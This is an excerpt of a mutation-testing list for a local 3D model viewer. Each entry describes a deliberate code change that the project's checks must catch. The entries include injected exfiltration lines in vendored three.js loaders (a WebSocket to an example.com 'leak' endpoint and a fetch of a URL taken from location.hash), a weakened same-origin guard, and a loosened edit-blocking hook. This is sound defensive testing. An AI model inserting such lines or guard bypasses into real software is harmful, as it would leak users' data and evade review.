...
MUTATIONS = [
    ...
    dict(name="product/vendor-gains-a-network-endpoint",
         ...
         must_fail=INVARIANTS),
    # Codex review round 10: NETWORK_APIS scanned app code only, so a vendored
    # WebSocket to a URL assembled at runtime passed every check.
    dict(name="vendor/runtime-websocket",
         expect="every network API in vendor/ has been reviewed",
         behaviour="a network API added to vendored code must be reviewed, whatever its URL",
         file="vendor/STLLoader.js",
         find="THREE.STLLoader = STLLoader;",
         replace="THREE.STLLoader = STLLoader; new WebSocket('ws' + 's://example.com/leak');",
         must_fail=INVARIANTS),
    dict(name="vendor/one-more-fetch",
         expect="every network API in vendor/ has been reviewed",
         behaviour="a count above the reviewed one fails, even for an API already in use",
         file="vendor/GLTFLoader.js",
         find="THREE.GLTFLoader = GLTFLoader;",
         replace="THREE.GLTFLoader = GLTFLoader; fetch(location.hash.slice(1));",
         must_fail=INVARIANTS),
    dict(name="hook/denies-vendor-metadata",
         expect="the hook lets every vendor/ metadata file be edited",
         behaviour="the hook must not block a metadata file a vendor upgrade has to edit",
         file=".claude/hooks/no_direct_viewer_edit.py",
         find=', "network_apis"}',
         replace="}",
         rebuild=False,
         must_fail=INVARIANTS),
    dict(name="hook/allows-a-vendored-library",
         expect="the hook lets every vendor/ metadata file be edited",
         behaviour="the hook must keep denying edits to the vendored libraries themselves",
         file=".claude/hooks/no_direct_viewer_edit.py",
         find=', "network_apis"}',
         replace=', "network_apis", "stlloader.js"}',
         rebuild=False,
         must_fail=INVARIANTS),
    ...
    # Codex review round 9: a URL known only at runtime -- the ?model= query, a
    # .gltf's buffer and image uris -- was fetched unchecked. Every such route
    # now goes through sameOrigin() in src/app/10-load.js.
    dict(name="product/model-query-fetched-unguarded",
         expect="every URL known only at runtime goes through sameOrigin",
         behaviour="?model= must not be fetched without the same-origin guard",
         file="src/app/60-io.js",
         find="fetch(sameOrigin(modelUrl))",
         replace="fetch(modelUrl)",
         must_fail=INVARIANTS),
    dict(name="product/loader-url-hook-removed",
         expect="every URL known only at runtime goes through sameOrigin",
         behaviour="three.js loaders must resolve every uri through the guard",
         file="src/app/10-load.js",
         find="THREE.DefaultLoadingManager.setURLModifier(sameOrigin);",
         replace="",
         must_fail=INVARIANTS),
    dict(name="product/loader-given-its-own-manager",
         expect="every URL known only at runtime goes through sameOrigin",
         behaviour="a loader with a private manager would bypass the hook",
         file="src/app/10-load.js",
         find="const gltfLoader = new THREE.GLTFLoader(),",
         replace="const gltfLoader = new THREE.GLTFLoader(new THREE.LoadingManager()),",
         must_fail=INVARIANTS),
    dict(name="viewer/same-origin-guard-admits-other-hosts",
         behaviour="sameOrigin() must compare origins, not merely accept http",
         file="src/app/10-load.js",
         find="u.origin === location.origin);",
         replace="u.protocol.startsWith('http'));",
         must_fail=JS),
    dict(name="viewer/same-origin-guard-admits-unc",
         behaviour="file://server/share is SMB on Windows and must be refused",
         file="src/app/10-load.js",
         find="(u.protocol === 'file:' ? u.host === '' :",
    ...
    dict(name="hook/blocks-the-vendor-upgrade-procedure",
         ...
         file=".claude/hooks/no_direct_viewer_edit.py",
         find='VENDOR_METADATA = {"sha256sums", "urls", "network_apis"}',
         replace='VENDOR_METADATA = {"sha256sums", "network_apis"}',
         must_fail=UNIT_PY),
    ...
    dict(name="launcher/check-cannot-fail",
         ...
         replace="",
         must_fail=UNIT_PY),
    # Codex review round 9: --check said "Setup OK" with viewer.html missing,
    # and with no usable cache folder, though a launch fails on both.
    dict(name="launcher/check-ignores-missing-viewer",
         behaviour="--check must fail when viewer.html is not next to the launcher",
         file="stepview.py",
         find="    if not VIEWER.is_file():\n        problems.append(",
         replace="    if False:\n        problems.append(",
         must_fail=UNIT_PY),
    dict(name="launcher/check-ignores-cache-folder",
         behaviour="--check must fail when the cache folder cannot be created or written",
         file="stepview.py",
         find="        CACHE_DIR.mkdir(exist_ok=True)\n        with tempfile.TemporaryFile(dir=CACHE_DIR):\n            pass\n",
         replace="        pass\n",
         must_fail=UNIT_PY),
    dict(name="launcher/check-ignores-setup-problems",
         behaviour="a setup problem must make --check exit non-zero, not just print",
         file="stepview.py",
         find="        ok = engine_ok and not problems\n",
         replace="        ok = engine_ok\n",
         must_fail=UNIT_PY),
